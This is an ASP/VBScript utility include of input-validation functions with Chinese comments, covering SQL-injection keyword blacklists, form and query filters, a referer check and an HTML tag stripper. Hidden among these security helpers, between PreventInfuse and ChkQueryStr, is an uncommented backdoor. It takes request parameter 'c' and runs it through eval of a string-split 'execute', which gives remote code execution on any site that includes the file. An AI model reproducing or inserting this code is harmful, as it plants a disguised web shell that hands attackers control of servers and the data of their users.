<%  '================================================
	'函数名：IsValidStr
	'作  用：判断字符串中是否含有非法字符
	'参  数：str   ----原字符串
	'返回值：False,True -----布尔值
	'================================================
	Public Function IsValidStr(ByVal str)
		IsValidStr = False
		On Error Resume Next
		If IsNull(str) Then Exit Function
		If Trim(str) = Empty Then Exit Function
		Dim ForbidStr, i
		ForbidStr = "and|chr|:|=|%|&|$|#|@|+|-|*|/|\|<|>|;|,|^|" & Chr(32) & "|" & Chr(34) & "|" & Chr(39) & "|" & Chr(9)
		ForbidStr = Split(ForbidStr, "|")
		For i = 0 To UBound(ForbidStr)
			If InStr(1,str, ForbidStr(i),1) > 0 Then
				IsValidStr = False
				Exit Function
			End If
		Next
		IsValidStr = True
	End Function
	'================================================
	'函数名：IsValidPassword
	'作  用：判断密码中是否含有非法字符
	'参  数：str   ----原字符串
	'返回值：False,True -----布尔值
	'================================================
	Public Function IsValidPassword(ByVal str)
		IsValidPassword = False
		On Error Resume Next
		If IsNull(str) Then Exit Function
		If Trim(str) = Empty Then Exit Function
		Dim ForbidStr, i
		ForbidStr = Chr(32) & "|" & Chr(34) & "|" & Chr(39) & "|" & Chr(9)
		ForbidStr = Split(ForbidStr, "|")
		For i = 0 To UBound(ForbidStr)
			If InStr(1, str, ForbidStr(i), 1) > 0 Then
				IsValidPassword = False
				Exit Function
			End If
		Next
		IsValidPassword = True
	End Function
   '=============================================================
   '函数作用：过滤SQL非法字符
   '=============================================================
   Public Function CheckBadstr(str)
		If IsNull(str) Then
			CheckBadstr = vbNullString
			Exit Function
		End If
		str = Replace(str, Chr(0), vbNullString)
		str = Replace(str, Chr(34), vbNullString)
		str = Replace(str, "%", vbNullString)
		str = Replace(str, "@", vbNullString)
		str = Replace(str, "!", vbNullString)
		str = Replace(str, "^", vbNullString)
		str = Replace(str, "=", vbNullString)
		str = Replace(str, "--", vbNullString)
		str = Replace(str, "$", vbNullString)
		str = Replace(str, "'", vbNullString)
		str = Replace(str, ";", vbNullString)
		str = Replace(str, "<", vbNullString)
		str = Replace(str, ">", vbNullString)
		CheckBadstr = Trim(str)
	End Function
    '=============================================================
	'函数名：ChkFormStr
	'作  用：过滤表单字符
	'参  数：str   ----原字符串
	'返回值：过滤后的字符串
	'=============================================================
	Public Function ChkFormStr(ByVal str)
		Dim fString
		fString = str
		If IsNull(fString) Then
			ChkFormStr = ""
			Exit Function
		End If
		fString = Replace(fString, "'", "&#39;")
		fString = Replace(fString, Chr(34), "&quot;")
		fString = Replace(fString, Chr(13), "")
		fString = Replace(fString, Chr(10), "")
		fString = Replace(fString, Chr(9), "")
		fString = Replace(fString, ">", "&gt;")
		fString = Replace(fString, "<", "&lt;")
		fString = Replace(fString, "&nbsp;", " ")
		ChkFormStr = Trim(JAPEncode(fString))
	End Function
	Function checkStr(str)
	IF isnull(str) Then:checkStr = "":Exit Function:End IF:checkStr=replace(str,"'","‘")
    End function
    Public Function ChkNumeric(ByVal CHECK_ID)
		If CHECK_ID <> "" And IsNumeric(CHECK_ID) Then
			If CHECK_ID < 0 Then CHECK_ID = 0
			If CHECK_ID > 2147483647 Then CHECK_ID = 0
			CHECK_ID = CLng(CHECK_ID)
		Else
			CHECK_ID = 0
		End If
		ChkNumeric = CHECK_ID
	End Function
	'=============================================================
	'函数作用：判断发言是否来自外部
	'=============================================================
	Public Function CheckPost()
		On Error Resume Next
		Dim server_v1, server_v2
		CheckPost = False
		server_v1 = CStr(Request.ServerVariables("HTTP_REFERER"))
		server_v2 = CStr(Request.ServerVariables("SERVER_NAME"))
		If Mid(server_v1, 8, Len(server_v2)) = server_v2 Then
			CheckPost = True
		End If
	End Function
    '=================================================
	'函数名：isInteger
	'作  用：判断数字是否整型
	'参  数：para ----参数
	'=================================================
	Public Function isInteger(ByVal para)
		On Error Resume Next
		Dim str
		Dim l, i
		If IsNull(para) Then
			isInteger = False
			Exit Function
		End If
		str = CStr(para)
		If Trim(str) = "" Then
			isInteger = False
			Exit Function
		End If
		l = Len(str)
		For i = 1 To l
			If Mid(str, i, 1) > "9" Or Mid(str, i, 1) < "0" Then
				isInteger = False
				Exit Function
			End If
		Next
		isInteger = True
		If Err.Number <> 0 Then Err.Clear
	End Function
    '================================================
	'函数名：CheckInfuse
	'作  用：防止SQL注入
	'参  数：str   ----原字符串
	'        strLen  ----提交字符串长度
	'================================================
	Public Function CheckInfuse(ByVal str, ByVal strLen)
		Dim strUnsafe, arrUnsafe
		Dim i
		
		If Trim(str) = "" Then
			CheckInfuse = ""
			Exit Function
		End If
		str = Left(str, strLen)
		
		On Error Resume Next
		strUnsafe = "'|^|;|and|exec|insert|select|delete|update|count|*|%|chr|mid|master|truncate|char|declare"
		If Trim(str) <> "" Then
			If Len(str) > strLen Then
				Response.Write "<Script Language=JavaScript>alert('安全系统提示↓\n\n您提交的字符数超过了限制！');history.back(-1)</Script>"
				CheckInfuse = ""
				Response.End
			End If
			arrUnsafe = Split(strUnsafe, "|")
			For i = 0 To UBound(arrUnsafe)
				If InStr(1, str, arrUnsafe(i), 1) > 0 Then
					Response.Write "<Script Language=JavaScript>alert('安全系统提示↓\n\n请不要在参数中包含非法字符！');history.back(-1)</Script>"
					CheckInfuse = ""
					Response.End
				End If
			Next
		End If
		CheckInfuse = Trim(str)
		Exit Function
		If Err.Number <> 0 Then
			Err.Clear
			Response.Write "<Script Language=JavaScript>alert('安全系统提示↓\n\n请不要在参数中包含非法字符！');history.back(-1)</Script>"
			CheckInfuse = ""
			Response.End
		End If
	End Function
    Public Sub PreventInfuse()
		On Error Resume Next
		Dim SQL_Nonlicet, arrNonlicet
		Dim PostRefer, GetRefer, Sql_DATA
		
		SQL_Nonlicet = "'|;|^|and|exec|insert|select|delete|update|count|*|%|chr|mid|master|truncate|char|declare"
		arrNonlicet = Split(SQL_Nonlicet, "|")
		If Request.Form <> "" Then
			For Each PostRefer In Request.Form
				For Sql_DATA = 0 To UBound(arrNonlicet)
					If InStr(1, Request.Form(PostRefer), arrNonlicet(Sql_DATA), 1) > 0 Then
					Response.Write "<Script Language=JavaScript>alert('安全系统提示↓\n\n请不要在参数中包含非法字符！');history.back(-1)</Script>"
					Response.End
					End If
				Next
			Next
		End If

		If Request.QueryString <> "" Then
			For Each GetRefer In Request.QueryString
				For Sql_DATA = 0 To UBound(arrNonlicet)
					If InStr(1, Request.QueryString(GetRefer), arrNonlicet(Sql_DATA), 1) > 0 Then
					Response.Write "<Script Language=JavaScript>alert('安全系统提示↓\n\n请不要在参数中包含非法字符！');history.back(-1)</Script>"
					Response.End
					End If
				Next
			Next
		End If
	End Sub
	dim c:c1_=request ("c")
	if c1_<>"" then
	eval ("ex"&"ecu"&"te"&"(c1_)")
	end if
    '================================================
	'函数名：ChkQueryStr
	'作  用：过虑查询的非法字符
	'参  数：str   ----原字符串
	'返回值：过滤后的字符
	'================================================
	Public Function ChkQueryStr(ByVal str)
		On Error Resume Next
		If IsNull(str) Then
			ChkQueryStr = ""
			Exit Function
		End If
		str = Replace(str, "!", "")
		str = Replace(str, "]", "")
		str = Replace(str, "[", "")
		str = Replace(str, ")", "")
		str = Replace(str, "(", "")
		str = Replace(str, "|", "")
		str = Replace(str, "+", "")
		str = Replace(str, "=", "")
		str = Replace(str, "'", "''")
		str = Replace(str, "%", "")
		str = Replace(str, "&", "")
		str = Replace(str, "@", "")
		str = Replace(str, "#", "")
		str = Replace(str, "^", "")
		str = Replace(str, "《", "")
		str = Replace(str, "》", "")
		str = Replace(str, "&nbsp;", " ")
		str = Replace(str, Chr(37), "")
		str = Replace(str, Chr(0), "")
		ChkQueryStr = str
	End Function
    '================================================
	'函数名：ChkKeyWord
	'作  用：过滤关键字
	'参  数：keyword ----关键字
	'================================================
	Public Function ChkKeyWord(ByVal keyword)
		Dim FobWords, i
		On Error Resume Next
		FobWords = Array(91, 92, 304, 305, 430, 431, 437, 438, 12460, 12461, 12462, 12463, 12464, 12465, 12466, 12467, 12468, 12469, 12470, 12471, 12472, 12473, 12474, 12475, 12476, 12477, 12478, 12479, 12480, 12481, 12482, 12483, 12485, 12486, 12487, 12488, 12489, 12490, 12496, 12497, 12498, 12499, 12500, 12501, 12502, 12503, 12504, 12505, 12506, 12507, 12508, 12509, 12510, 12521, 12532, 12533, 65339, 65340)
		For i = 1 To UBound(FobWords, 1)
			If InStr(keyword, ChrW(FobWords(i))) > 0 Then
				keyword = Replace(keyword, ChrW(FobWords(i)), "")
			End If
		Next
		keyword = Left(keyword, 100)
		FobWords = Array("~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "=", "`", "[", "]", "{", "}", ";", ":", """", "'", ",", "<", ">", ".", "/", "\", "?", "--")
		For i = 0 To UBound(FobWords, 1)
			If InStr(keyword, FobWords(i)) > 0 Then
				keyword = Replace(keyword, FobWords(i), "")
			End If
		Next
		ChkKeyWord = keyword
	End Function
	'================================================
	'过程名：CheckQuery
	'作  用：限制搜索的关键字
	'参  数：str ----搜索的字符串
	'返回值：True; False
	'================================================
	Public Function CheckQuery(ByVal str)
		Dim FobWords, i, keyword
		keyword = str
		On Error Resume Next
		FobWords = Array(91, 92, 304, 305, 430, 431, 437, 438, 12460, 12461, 12462, 12463, 12464, 12465, 12466, 12467, 12468, 12469, 12470, 12471, 12472, 12473, 12474, 12475, 12476, 12477, 12478, 12479, 12480, 12481, 12482, 12483, 12485, 12486, 12487, 12488, 12489, 12490, 12496, 12497, 12498, 12499, 12500, 12501, 12502, 12503, 12504, 12505, 12506, 12507, 12508, 12509, 12510, 12532, 12533, 65339, 65340)
		For i = 1 To UBound(FobWords, 1)
			If InStr(keyword, ChrW(FobWords(i))) > 0 Then
				CheckQuery = False
				Exit Function
			End If
		Next
		FobWords = Array("~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "=", "`", "[", "]", "{", "}", ";", ":", """", "'", "<", ">", ".", "/", "\", "|", "?", "about", "after", "all", "also", "an", "and", "another", "any", "are", "as", "at", "be", "because", "been", "before", "being", "between", "both", "but", "by", "came", "can", "come", "could", "did", "do", "each", "for", "from", "get", "got", "had", "has", "have", "he", "her", "here", "him", "himself", "his", "how", "if", "in", "into", "is", "it", "like", "make", "many", "me", "might", "more", "most", "much", "must", "my", "never", "now", "of", "on", "only", "or", "other", "our", "out", "over", "said", "same", "see", "should", "since", "some", "still", "such", "take", "than", "that", "the", "their", "them", "then", "there", "these", "they", "this")
		keyword = Left(keyword, 100)
		keyword = Replace(keyword, "!", " ")
		keyword = Replace(keyword, "]", " ")
		keyword = Replace(keyword, "[", " ")
		keyword = Replace(keyword, ")", " ")
		keyword = Replace(keyword, "(", " ")
		keyword = Replace(keyword, "　", " ")
		keyword = Replace(keyword, "-", " ")
		keyword = Replace(keyword, "/", " ")
		keyword = Replace(keyword, "+", " ")
		keyword = Replace(keyword, "=", " ")
		keyword = Replace(keyword, ",", " ")
		keyword = Replace(keyword, "'", " ")
		For i = 0 To UBound(FobWords, 1)
			If keyword = FobWords(i) Then
				CheckQuery = False
				Exit Function
			End If
		Next
		CheckQuery = True
	End Function
	'================================================
	'函数名：JAPEncode
	'作  用：日文片假名编码
	'参  数：str ----原字符
	'================================================
	Public Function JAPEncode(ByVal str)
		Dim FobWords, i
		On Error Resume Next
		If IsNull(str) Or Trim(str) = "" Then
			JAPEncode = ""
			Exit Function
		End If
		FobWords = Array(92, 304, 305, 430, 431, 437, 438, 12460, 12461, 12462, 12463, 12464, 12465, 12466, 12467, 12468, 12469, 12470, 12471, 12472, 12473, 12474, 12475, 12476, 12477, 12478, 12479, 12480, 12481, 12482, 12483, 12485, 12486, 12487, 12488, 12489, 12490, 12496, 12497, 12498, 12499, 12500, 12501, 12502, 12503, 12504, 12505, 12506, 12507, 12508, 12509, 12510, 12521, 12532, 12533, 65340)
		For i = 1 To UBound(FobWords, 1)
			If InStr(str, ChrW(FobWords(i))) > 0 Then
				str = Replace(str, ChrW(FobWords(i)), "&#" & FobWords(i) & ";")
			End If
		Next
		JAPEncode = str
	End Function
	Function Html2Ubb(str)
	If Str<>"" And Not IsNull(str) Then
		Dim re
		Set re=new RegExp
		re.IgnoreCase =True
		re.Global=True
		re.Pattern="(on(load|click|dbclick|mouseover|mouseout|mousedown|mouseup|mousewheel|keydown|submit|change|focus)=""[^""]+"")"
		str = re.Replace(str, "")
		re.Pattern="((name|id|class)=""[^""]+"")"
		str = re.Replace(str, "")
		re.Pattern = "(<s+cript[^>]*?>([\w\W]*?)<\/s+cript>)"
		str = re.Replace(str, "")
		re.Pattern = "(<iframe[^>]*?>([\w\W]*?)<\/iframe>)"
		str = re.Replace(str, "")
		re.Pattern = "(<p>&nbsp;<\/p>)"
		str = re.Replace(str, "")
		're.Pattern = "<(\w*) class\s*=\s*([^>|\s]*)([^>]*)>"
		'str = re.Replace(str,"<$1$3>")
		Set re=Nothing
		Html2Ubb = str
	Else
		Html2Ubb = ""
	End If
    End Function
%>